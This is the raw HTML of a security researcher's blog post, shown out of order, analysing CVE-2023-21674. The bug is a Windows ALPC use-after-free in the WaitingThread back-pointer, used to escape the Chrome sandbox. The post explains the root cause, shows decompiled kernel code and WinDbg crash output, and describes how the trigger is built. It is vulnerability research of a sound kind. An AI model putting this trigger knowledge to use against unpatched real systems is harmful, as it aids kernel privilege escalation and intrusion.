+STACK_COMMAND:.process /r /p &lt;span class=&#34;hljs-number&#34;&gt;0xffff900dc2556240&lt;/span&gt;; .thread /r /p &lt;span class=&#34;hljs-number&#34;&gt;0xffff900dc22be600&lt;/span&gt; ; kbBUCKET_ID_FUNC_OFFSET:  &lt;span class=&#34;hljs-number&#34;&gt;358&lt;/span&gt;
+
+FAILURE_BUCKET_ID:  AV_VRFK_nt!AlpcpCancelMessage
+
+OS_VERSION:  &lt;span class=&#34;hljs-number&#34;&gt;10.0&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.22621&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.1&lt;/span&gt;
+
+BUILDLAB_STR:  ni_release
+
+OSPLATFORM_TYPE:  x64
+
+OSNAME:  Windows &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;
+
+FAILURE_ID_HASH:  {b76e5108-ed87-f585&lt;span class=&#34;hljs-number&#34;&gt;-7&lt;/span&gt;c9b&lt;span class=&#34;hljs-number&#34;&gt;-99750f&lt;/span&gt;572740}
+
+Followup:     MachineOwner&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Cracking the dump open in &lt;code&gt;kd&lt;/code&gt; after the BSOD, the STOP code is &lt;code&gt;PAGE_FAULT_IN_NONPAGED_AREA (0x50)&lt;/code&gt;, the faulting IP is &lt;code&gt;nt!AlpcpCancelMessage + 0x358&lt;/code&gt;, and the faulting instruction is &lt;code&gt;xchg qword ptr [reg+578h], reg2&lt;/code&gt;. Exactly where we predicted! But &lt;code&gt;!analyze -v&lt;/code&gt; only tells us &amp;#x201C;it died here,&amp;#x201D; not &amp;#x201C;why it &lt;em&gt;had&lt;/em&gt; to die here&amp;#x201D;&amp;#x2026; so let&amp;#x2019;s rewind to the actual register state at the moment of the fault!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; .process /r /p &lt;span class=&#34;hljs-number&#34;&gt;0xffff900dc2556240&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; .thread /r /p &lt;span class=&#34;hljs-number&#34;&gt;0xffff900dc22be600&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; .frame /r &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;07&lt;/span&gt; ffffc182d4b56820 fffff8037e0fc09b     nt!AlpcpCancelMessage+&lt;span class=&#34;hljs-number&#34;&gt;0x358&lt;/span&gt;
+rax=&lt;span class=&#34;hljs-number&#34;&gt;0000000000000000&lt;/span&gt; rbx=ffffa307cb0b0ce0 rcx=ffff900dcddce600
+rdx=&lt;span class=&#34;hljs-number&#34;&gt;000000006b&lt;/span&gt;577350 rsi=&lt;span class=&#34;hljs-number&#34;&gt;0000000000000000&lt;/span&gt; rdi=&lt;span class=&#34;hljs-number&#34;&gt;0000000000000000&lt;/span&gt;
+rip=fffff8037e0fcf6c rsp=ffffc182d4b56820 rbp=&lt;span class=&#34;hljs-number&#34;&gt;0000000000000001&lt;/span&gt;
+r8=&lt;span class=&#34;hljs-number&#34;&gt;0000000000000000&lt;/span&gt;  r9=&lt;span class=&#34;hljs-number&#34;&gt;7f&lt;/span&gt;fffffffffffffc r10=&lt;span class=&#34;hljs-number&#34;&gt;0000000000000000&lt;/span&gt;
+r13=&lt;span class=&#34;hljs-number&#34;&gt;0000000000000000&lt;/span&gt;  r14=ffff900dc9466e20 r15=&lt;span class=&#34;hljs-number&#34;&gt;0000000000000001&lt;/span&gt;
+nt!AlpcpCancelMessage+&lt;span class=&#34;hljs-number&#34;&gt;0x358&lt;/span&gt;:
+fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7e0&lt;/span&gt;fcf6c &lt;span class=&#34;hljs-number&#34;&gt;48878178050000&lt;/span&gt;  xchg    rax,qword ptr [rcx+&lt;span class=&#34;hljs-number&#34;&gt;578&lt;/span&gt;h]&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;.frame /r 7&lt;/code&gt; restores the register context all the way down to stack frame 7 (&lt;code&gt;AlpcpCancelMessage&lt;/code&gt;). Right after a raw &lt;code&gt;!analyze -v&lt;/code&gt;, kd is parked at &lt;code&gt;DbgBreakPointWithStatus&lt;/code&gt;, and whatever &lt;code&gt;r&lt;/code&gt; prints reflects &amp;#x201C;wherever the debugger is stopped,&amp;#x201D; not the values from the moment the kernel died. This command turns the clock back.&lt;/p&gt;
+&lt;p&gt;Of the rolled-back values, here are the ones we care about:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;rip = nt!AlpcpCancelMessage+0x358 &amp;#x2014; that exact xchg&lt;/li&gt;
+&lt;li&gt;rcx = ffff900dcddce600 &amp;#x2014; the dangling pointer&lt;/li&gt;
+&lt;li&gt;rax = 0, r13 = 0 &amp;#x2014; the value being written (just 0)&lt;/li&gt;
+&lt;li&gt;rbx = ffffa307cb0b0ce0 &amp;#x2014; the msg we&amp;#x2019;re currently iterating on&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Now if we just peel back a few instructions around the xchg, the picture of why it died right here comes into focus!!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; u nt!AlpcpCancelMessage+&lt;span class=&#34;hljs-number&#34;&gt;0x340&lt;/span&gt; L10
++&lt;span class=&#34;hljs-number&#34;&gt;0x340&lt;/span&gt;   call nt!PsReleaseProcessWakeCounter    ; other cleanup work
++&lt;span class=&#34;hljs-number&#34;&gt;0x349&lt;/span&gt;   mov  [rbx+&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;D8h], r13                    ; msg[+&lt;span class=&#34;hljs-number&#34;&gt;0xD8&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; (flag stuff)
++&lt;span class=&#34;hljs-number&#34;&gt;0x350&lt;/span&gt;   mov  rcx, [rbx+&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;h]                     ; load msg[+&lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;] into rcx
++&lt;span class=&#34;hljs-number&#34;&gt;0x354&lt;/span&gt;   test rcx, rcx                           ;   &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt; check
++&lt;span class=&#34;hljs-number&#34;&gt;0x357&lt;/span&gt;   je   +&lt;span class=&#34;hljs-number&#34;&gt;0x3c9&lt;/span&gt;                             ;   &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, skip &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt; logic
++&lt;span class=&#34;hljs-number&#34;&gt;0x359&lt;/span&gt;   mov  rax, r13                           ; rax = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; (value to erase with)
++&lt;span class=&#34;hljs-number&#34;&gt;0x35C&lt;/span&gt;   xchg rax, [rcx+&lt;span class=&#34;hljs-number&#34;&gt;578&lt;/span&gt;h]                    ; atomic-write &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; into +&lt;span class=&#34;hljs-number&#34;&gt;0x578&lt;/span&gt; of what rcx points to
++&lt;span class=&#34;hljs-number&#34;&gt;0x363&lt;/span&gt;   cmp  rax, rbx                           ; check &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; the previous value was our msg pointer&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Pull out some kernel-object pointer stored at offset 0x20 of msg, then atomically write 0 into that object&amp;#x2019;s +0x578 field. As the Part 2 kernel RE spelled out, &lt;code&gt;msg[+0x20]&lt;/code&gt; is exactly the WaitingThread field &amp;#x2014; the pressure point of our UAF. &lt;code&gt;AlpcpDispatchNewMessage&lt;/code&gt; plants the trigger thread&amp;#x2019;s &lt;code&gt;_ETHREAD&lt;/code&gt; pointer into this field at send time, and 40 seconds later, when we close the handle, port cleanup dereferences this field again to try to clean up the pending state&amp;#x2026; but? That thread is already dead and its &lt;code&gt;_ETHREAD&lt;/code&gt; itself has been freed!&lt;/p&gt;
+&lt;p&gt;But honestly &amp;#x2014; this BSOD is only circumstantial evidence that the &amp;#x201C;UAF actually stepped on a dangling pointer&amp;#x201D;; it is not a complete Sandbox Escape yet! &amp;#x1F643; For the exploit to work, that pointer left in &lt;code&gt;msg+0x20&lt;/code&gt; can&amp;#x2019;t be pointing at just any random page &amp;#x2014; we need to &lt;strong&gt;reclaim&lt;/strong&gt; the slab so it points at a &lt;strong&gt;live &lt;code&gt;_ETHREAD&lt;/code&gt; that we control&lt;/strong&gt;. Right now we&amp;#x2019;re basically just faceplanting on top of the dangling.&lt;/p&gt;
+&lt;p&gt;Tai Lung got his feather and the chains came off, but there&amp;#x2019;s still a long road ahead before he can go find Master Shifu &amp;#x2014; that&amp;#x2019;s where we are!!&lt;/p&gt;
+&lt;h1 id=&#34;4-Outro-So-how-do-you-actually-exploit-this-Step-6-preview&#34;&gt;&lt;a href=&#34;#4-Outro-So-how-do-you-actually-exploit-this-Step-6-preview&#34; class=&#34;headerlink&#34; title=&#34;4. Outro: So how do you actually exploit this? (Step 6 preview)&#34;&gt;&lt;/a&gt;4. Outro: So how do you actually exploit this? (Step 6 preview)&lt;/h1&gt;&lt;p&gt;You made it &amp;#x2014; nice work! But as you may have noticed, everything we did up to here was really just me taking Theori&amp;#x2019;s original write-up and padding it with stuff I dug up on my own. The genuinely fun part starts now, haha&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image14.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Even Theori itself basically just says &amp;#x201C;use file pickers and you can chain this all the way to Medium code execution&amp;#x201D; and leaves it at that.. as for the actual details? Silence. &amp;#x1F602; &lt;del&gt;But there&amp;#x2019;s no way I&amp;#x2019;m gonna give up on that&lt;/del&gt;&lt;/p&gt;
+&lt;p&gt;How this UAF gets us a &lt;strong&gt;Read/Write primitive&lt;/strong&gt;, and how that primitive gets us to &lt;strong&gt;Medium-privilege code execution&lt;/strong&gt; &amp;#x2014; i.e. how, holding OUYA77&amp;#x2019;s &amp;#x201C;feather for Tai Lung,&amp;#x201D; we break out of the prison cell and go find Master Shifu &amp;#x2014; continues in the next &lt;strong&gt;Step 6&lt;/strong&gt;!&lt;/p&gt;
+&lt;p&gt;See you in the next one~ &amp;#x1F44B;&lt;/p&gt;
+&lt;h1 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference.&#34;&gt;&lt;/a&gt;Reference.&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/hd3s5aa/CVE-2023-21674/blob/main/CVE-2023-21674.cpp&#34;&gt;https://github.com/hd3s5aa/CVE-2023-21674/blob/main/CVE-2023-21674.cpp&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape&#34;&gt;https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape&lt;/a&gt;&lt;/p&gt;
+ - hack &amp; life">
+  <meta name="author" content="j0dev, y2sman">
+  <meta name="keywords" content>
+  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
+  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">
+
+
+  <meta property="og:type" content="website"> 
+  <meta property="og:title" content="[Wipeload Step 5.] Sorry, I studied ALPC just to show you this (EN) - hackyboiz">
+  <meta property="og:description" content="&lt;p&gt;Hi everyone! Today gongjae is back with Step 5 &amp;#x2014; the crown jewel of the Wipeload project, haha.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Previous research posts&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2026/06/06/OUYA77/Wipeload_step1/en/&#34;&gt;https://hackyboiz.github.io/2026/06/06/OUYA77/Wipeload_step1/en/&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2026/06/21/ji9umi/Wipeload_step2/en/&#34;&gt;https://hackyboiz.github.io/2026/06/21/ji9umi/Wipeload_step2/en/&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2026/06/26/ji9umi/Wipeload_step3/en/&#34;&gt;https://hackyboiz.github.io/2026/06/26/ji9umi/Wipeload_step3/en/&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2026/07/13/OUYA77/Wipeload_step4/en/&#34;&gt;https://hackyboiz.github.io/2026/07/13/OUYA77/Wipeload_step4/en/&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Steps 2&amp;#x2013;3 covered ji9umi&amp;#x2019;s Renderer RCE, and in Step 4 OUYA77 gave us a detailed tour of the Chrome sandbox. Picking up that Way from both of them, I&amp;#x2019;m going to walk you through &amp;#x2014; in detail &amp;#x2014; &lt;strong&gt;how do we actually get to Medium-privilege code execution from Chrome?&lt;/strong&gt; In today&amp;#x2019;s Step 5 I&amp;#x2019;ll explain ALPC, the key ingredient of the Sandbox Escape, and in Step 6 we&amp;#x2019;ll take that ALPC and see how it takes us all the way to Medium-privilege code execution!&lt;/p&gt;
+&lt;p&gt;Shall we get right into it? Let&amp;#x2019;s go~&lt;/p&gt;
+&lt;h1 id=&#34;1-Sorry-I-studied-ALPC-just-to-show-you-this&#34;&gt;&lt;a href=&#34;#1-Sorry-I-studied-ALPC-just-to-show-you-this&#34; class=&#34;headerlink&#34; title=&#34;1. Sorry, I studied ALPC just to show you this&#34;&gt;&lt;/a&gt;1. Sorry, I studied ALPC just to show you this&lt;/h1&gt;&lt;p&gt;ALPC (Advanced Local Procedure Call) is the IPC that sits at the very bottom of process-to-process conversations inside Windows. The local RPC we&amp;#x2019;re all familiar with, at the kernel level, mostly ends up riding ALPC too, and system services everyone has heard of like &amp;#x201C;csrss.exe&amp;#x201D; or &amp;#x201C;lsass.exe&amp;#x201D;, DCOM, WinRT activation&amp;#x2026; pretty much every user-mode service is talking over an ALPC port somewhere. Chrome is no exception &amp;#x2014; the Mojo IPC pipe between the renderer and the browser has ALPC partially baked into its underlying transport. Which is to say: the object we&amp;#x2019;re going to be poking at today is dead common, but the kind of thing you&amp;#x2019;d miss unless you look closely!!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image2.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;?? : You studied ALPC just to do THIS?&lt;br&gt;gongjae : &lt;del&gt;Nope, just did it for fun&lt;/del&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Inside the kernel, two objects star in this show. &lt;code&gt;_ALPC_PORT&lt;/code&gt; is the communication endpoint, and &lt;code&gt;KALPC_MESSAGE&lt;/code&gt; is a single message flowing through that endpoint. Easiest mental model: server opens a port, clients attach, they exchange messages!&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2025/11/29/gongjae/Windows_ALPC/KR/&#34;&gt;https://hackyboiz.github.io/2025/11/29/gongjae/Windows_ALPC/KR/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Actually, we already went over ALPC once in a previous research post, right? Stuff like the port splitting into two tiers of connection port / communication port, and basic message-attribute concepts &amp;#x2014; I put all of that together in the earlier ALPC post! If this is your first time hearing about ALPC, I&amp;#x2019;d recommend giving that one a skim first&amp;#x2026; but honestly the single most important fact is: &lt;strong&gt;how does the Chrome sandbox treat ALPC?&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image3.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The answer: the &lt;code&gt;NtAlpc*&lt;/code&gt; family of syscalls themselves are &lt;strong&gt;not&lt;/strong&gt; on the sandbox&amp;#x2019;s filter list!! Even though it&amp;#x2019;s an undocumented interface with nothing on the official docs, it&amp;#x2019;s a very-much-alive API, so even an Untrusted IL renderer can call the stubs &lt;code&gt;ntdll&lt;/code&gt; exports directly.&lt;/p&gt;
+&lt;h2 id=&#34;1-1-Sync-vs-Async&#34;&gt;&lt;a href=&#34;#1-1-Sync-vs-Async&#34; class=&#34;headerlink&#34; title=&#34;1.1 Sync vs Async&#34;&gt;&lt;/a&gt;1.1 Sync vs Async&lt;/h2&gt;&lt;p&gt;There are two ways to send a message over ALPC. &lt;strong&gt;Async&lt;/strong&gt; requests toss the request onto a queue and the calling thread goes on its merry way. &lt;strong&gt;Sync&lt;/strong&gt; requests, on the other hand, park the calling thread inside the kernel until an answer comes back!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image4.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;For the kernel to sustain that &amp;#x201C;parked&amp;#x201D; state, it obviously needs some info, right? Which thread is waiting on which message, who to wake up when the reply lands &amp;#x2014; that stuff has to be recorded somewhere!&lt;/p&gt;
+&lt;aside&gt;
+&amp;#x1F4A1;
+
+Quick aside on why the two modes are asymmetric here: async requests don&amp;#x2019;t need the kernel to know &amp;#x201C;who&amp;#x2019;s waiting on this reply?&amp;#x201D; As long as the completion callback is correctly registered, we&amp;#x2019;re done. &amp;#x1FAE0;
+Sync is a different story though. The moment the reply arrives, the kernel code handling it has to figure out **&amp;#x201C;okay, I got this &amp;#x2014; who exactly am I supposed to wake up??&amp;#x201D;**, and that answer has to be pre-stored as a back-pointer somewhere.
+
+&lt;/aside&gt;
+
+&lt;h2 id=&#34;1-2-Waiting-thread&#34;&gt;&lt;a href=&#34;#1-2-Waiting-thread&#34; class=&#34;headerlink&#34; title=&#34;1.2 Waiting thread&#34;&gt;&lt;/a&gt;1.2 Waiting thread&lt;/h2&gt;&lt;p&gt;So when a sync request comes in, the kernel slips a back-pocket pointer into the message object that says &amp;#x201C;the thread waiting on this message&amp;#x2019;s reply is THIS guy!!&amp;#x201D; That&amp;#x2019;s the &lt;code&gt;_KALPC_MESSAGE.WaitingThread&lt;/code&gt; field, and in the environment I&amp;#x2019;m experimenting with today, Windows 22H2 22621.963, it lives at offset +0x20.&lt;/p&gt;
+&lt;p&gt;There&amp;#x2019;s a matching field going the other direction too. On the thread side there&amp;#x2019;s a field that records &amp;#x201C;the message I&amp;#x2019;m currently waiting on is THIS guy!!&amp;#x201D; &amp;#x2014; that&amp;#x2019;s &lt;code&gt;_ETHREAD.AlpcMessageId&lt;/code&gt;, located at offset +0x578. WaitingThread from earlier and this AlpcMessageId form a pair of back-pointers pointing at each other!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image5.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Kind of like how Tai Lung and Master Shifu shared a special bond back when Tai Lung was little&amp;#x2026;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;There&amp;#x2019;s a reason the kernel bothers to write this pair with &lt;code&gt;_InterlockedExchange&lt;/code&gt; atomically&amp;#x2026; since the same thread can be touched from multiple places at once, you need atomicity to avoid races. &amp;#x1F602;&lt;/p&gt;
+&lt;p&gt;But even so &amp;#x2014; when the pair matches it&amp;#x2019;s beautiful, and the moment one side falls out of step, that&amp;#x2019;s when things go sideways. The main character of today&amp;#x2019;s vuln is this very field, and an unmanaged back-pointer is guaranteed to blow up in your face sooner or later, haha!&lt;/p&gt;
+&lt;h1 id=&#34;2-Root-Cause&#34;&gt;&lt;a href=&#34;#2-Root-Cause&#34; class=&#34;headerlink&#34; title=&#34;2. Root Cause&#34;&gt;&lt;/a&gt;2. Root Cause&lt;/h1&gt;&lt;p&gt;Alright, as I said above, we need to see why this unmanaged back-pointer is the seed of the vuln, right? But first, let&amp;#x2019;s quickly review sync vs async messaging through some code!&lt;/p&gt;
+&lt;h2 id=&#34;2-1-ALPC-MSGFLG-SYNC-REQUEST&#34;&gt;&lt;a href=&#34;#2-1-ALPC-MSGFLG-SYNC-REQUEST&#34; class=&#34;headerlink&#34; title=&#34;2.1 ALPC_MSGFLG_SYNC_REQUEST&#34;&gt;&lt;/a&gt;2.1 ALPC_MSGFLG_SYNC_REQUEST&lt;/h2&gt;&lt;p&gt;The entry point where a message actually lands on the queue is &lt;code&gt;AlpcpDispatchNewMessage&lt;/code&gt;. That &amp;#x201C;somewhere in the middle&amp;#x201D; I mentioned earlier is right here! Looking at it in IDA it feels like this:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ((SendFlags &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x20000&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {          &lt;span class=&#34;hljs-comment&#34;&gt;// ALPC_MSGFLG_SYNC_REQUEST&lt;/span&gt;
+    &lt;span class=&#34;hljs-comment&#34;&gt;// plant the thread back-pointer&lt;/span&gt;
+    *(_QWORD *)(msg + &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;) = curthread;                 &lt;span class=&#34;hljs-comment&#34;&gt;// msg.WaitingThread = current _ETHREAD&lt;/span&gt;
+    _InterlockedExchange64(curthread + &lt;span class=&#34;hljs-number&#34;&gt;0x578&lt;/span&gt;, msg);      &lt;span class=&#34;hljs-comment&#34;&gt;// _ETHREAD.AlpcMessageId = msg&lt;/span&gt;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Two lines, that&amp;#x2019;s the whole trick. Stuff the current thread&amp;#x2019;s &lt;code&gt;_ETHREAD&lt;/code&gt; directly into &lt;code&gt;msg+0x20&lt;/code&gt;, and conversely plant the message at &lt;code&gt;curthread + 0x578&lt;/code&gt;. That completes the pair of back-pointers pointing at each other.&lt;/p&gt;
+&lt;p&gt;Let&amp;#x2019;s also briefly trace how SendFlags gets here.&lt;/p&gt;
+&lt;aside&gt;
+&amp;#x1F4A1;
+
+When user code calls `NtAlpcSendWaitReceivePort`, the kernel enters `AlpcpSendMessage`, decides routing, and then hands off to this `AlpcpDispatchNewMessage`. The trigger I&amp;#x2019;m using today goes through `NtWaitForWorkViaWorkerFactory`, but even there &amp;#x2014; the moment it processes a deferred send &amp;#x2014; we end up at that same dispatch site.
+&amp;#x2192; Bottom line: no matter which road you take, if `SendFlags &amp;amp; 0x20000` is satisfied, those two lines run!!
+
+&lt;/aside&gt;
+
+&lt;p&gt;&lt;code&gt;SendFlags &amp;amp; 0x20000&lt;/code&gt; is checking the &lt;code&gt;ALPC_MSGFLG_SYNC_REQUEST&lt;/code&gt; flag &amp;#x2014; if it were an async request, those two lines get skipped wholesale, right? So to hit this vuln you absolutely have to set 0x20000 in SendFlags and take the sync-request branch. The original Theori blog really emphasized this too!!&lt;/p&gt;
+&lt;p&gt;One more thing worth noting: the reason the setting is stamped in both directions is to leave no gaps when routing the reply. But this pair hides a fun little asymmetry &amp;#x2014; would you believe me???&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image6.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;When the thread dies, the &lt;code&gt;_ETHREAD&lt;/code&gt; gets deleted entirely, so the &lt;code&gt;AlpcMessageId&lt;/code&gt; on the other side also disappears with it&lt;/li&gt;
+&lt;li&gt;But the WaitingThread planted on the message side stays right there as long as the message is alive&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;This asymmetry is exactly the starting point of the vulnerability!&lt;/p&gt;
+&lt;h2 id=&#34;2-2-SYNC-REQUEST-Use-After-Free&#34;&gt;&lt;a href=&#34;#2-2-SYNC-REQUEST-Use-After-Free&#34; class=&#34;headerlink&#34; title=&#34;2-2. SYNC_REQUEST Use-After-Free&#34;&gt;&lt;/a&gt;2-2. SYNC_REQUEST Use-After-Free&lt;/h2&gt;&lt;p&gt;This back-pointer pair has no concept of lifetime management. It gets &lt;em&gt;set&lt;/em&gt;, but there&amp;#x2019;s no janitor to clean up the WaitingThread inside the message when the thread dies!! &amp;#x1F9F9; That is, no exaggeration, the root of today&amp;#x2019;s vuln.&lt;/p&gt;
+&lt;p&gt;Layering a reference-counting lens on top makes it click. In the Windows kernel, the by-the-book way to store an object pointer inside another object is: bump the refcount with &lt;code&gt;ObReferenceObjectByPointer&lt;/code&gt;, and when you&amp;#x2019;re done, drop it back down with the matching dereference.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image7.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&amp;#x2192; But WaitingThread?? It just plants a raw pointer, that&amp;#x2019;s it!&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;It doesn&amp;#x2019;t touch the &lt;code&gt;_ETHREAD&lt;/code&gt; refcount, and it doesn&amp;#x2019;t clean up this slot on destruction&amp;#x2026; &amp;#x1F975;&lt;/p&gt;
+&lt;p&gt;The consequence: even after the thread dies, its refcount hits 0, and it gets returned to the pool slab &amp;#x2014; this raw pointer just sits there, unbothered!! That opens up the following scenario.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image8.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Some thread sends a SYNC message and plants itself into msg+0x20&lt;/li&gt;
+&lt;li&gt;That thread dies via &lt;code&gt;NtTerminateThread&lt;/code&gt;, and via &lt;code&gt;CloseHandle(hThread)&lt;/code&gt; and &lt;code&gt;CloseHandle(hWorkerFactory)&lt;/code&gt; the &lt;code&gt;_ETHREAD&lt;/code&gt; gets returned to the &lt;code&gt;NonPagedPoolNx&lt;/code&gt; Thre-tag slab&lt;/li&gt;
+&lt;li&gt;Because the worker factory is holding one reference on the thread, just closing the thread handle isn&amp;#x2019;t enough to release the slab&lt;/li&gt;
+&lt;li&gt;Result: the WaitingThread inside the message keeps pointing at what is now a pointer that will get freed!!&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Sounds like OUYA77&amp;#x2019;s feather-for-Tai-Lung from Step 4 is now sitting on the table, doesn&amp;#x2019;t it? Right now it looks like a totally useless feather, but the moment the kernel touches this message again and dereferences msg+0x20 &amp;#x2014; boom, UAF.&lt;/p&gt;
+&lt;h2 id=&#34;2-3-How-to-Trigger-UAF&#34;&gt;&lt;a href=&#34;#2-3-How-to-Trigger-UAF&#34; class=&#34;headerlink&#34; title=&#34;2.3 How to Trigger UAF?&#34;&gt;&lt;/a&gt;2.3 How to Trigger UAF?&lt;/h2&gt;&lt;p&gt;Okay, now let&amp;#x2019;s look at how you actually &lt;strong&gt;fire&lt;/strong&gt; this unmanaged back-pointer! The trigger is split across two threads. One is the &lt;strong&gt;trigger thread&lt;/strong&gt;, which queues the message, plants itself, then falls asleep inside the kernel. The other is the &lt;strong&gt;main thread&lt;/strong&gt;, which kills the trigger thread and, at the very end, lights the fuse!&lt;/p&gt;
+&lt;p&gt;But here&amp;#x2019;s a new object we haven&amp;#x2019;t met: &lt;strong&gt;WorkerFactory&lt;/strong&gt;. It&amp;#x2019;s a kernel object that arrived in Vista as the backend of the Windows thread pool, playing housekeeper &amp;#x2014; creating, maintaining, and reclaiming its own worker threads.&lt;/p&gt;
+&lt;p&gt;Normally a worker thread&amp;#x2019;s life in the Windows thread pool is dead simple. It calls &lt;code&gt;NtWaitForWorkViaWorkerFactory&lt;/code&gt; and dozes inside the kernel until there&amp;#x2019;s a work item to handle; when work shows up it wakes up, does the job, and goes back to sleep via this syscall. So this syscall is the thread pool&amp;#x2019;s &lt;strong&gt;&amp;#x201C;worker, wait here until there&amp;#x2019;s work&amp;#x201D;&lt;/strong&gt; parking spot.&lt;/p&gt;
+&lt;p&gt;But we have zero interest in actually running a thread pool. We just create a bare-shell WorkerFactory with &lt;code&gt;NtCreateWorkerFactory&lt;/code&gt; and then, pretending to be a worker, we call &lt;code&gt;NtWaitForWorkViaWorkerFactory&lt;/code&gt; ourselves to &lt;strong&gt;hitch a ride on that &amp;#x201C;worker-waiting-for-work&amp;#x201D; mechanism&lt;/strong&gt;.&lt;/p&gt;
+&lt;aside&gt;
+&amp;#x1F4A1;
+
+But why build the trigger on *this specific* syscall? There&amp;#x2019;s a reason!
+`NtWaitForWorkViaWorkerFactory` takes as its last argument an undocumented struct called `WORKER_FACTORY_DEFERRED_WORK` (WFDW for short), which the kernel consumes inside &amp;#x2014; and one of its fields is `AlpcSendMessageFlags`. Which means user code can just jam 0x20000 in there directly&amp;#x2026;!
+&amp;#x2192; In other words, &amp;#x201C;hey kernel, please queue a SYNC-natured ALPC message on my behalf!!&amp;#x201D; &amp;#x2014; a back door is sitting wide open right here. &amp;#x1F60E;
+
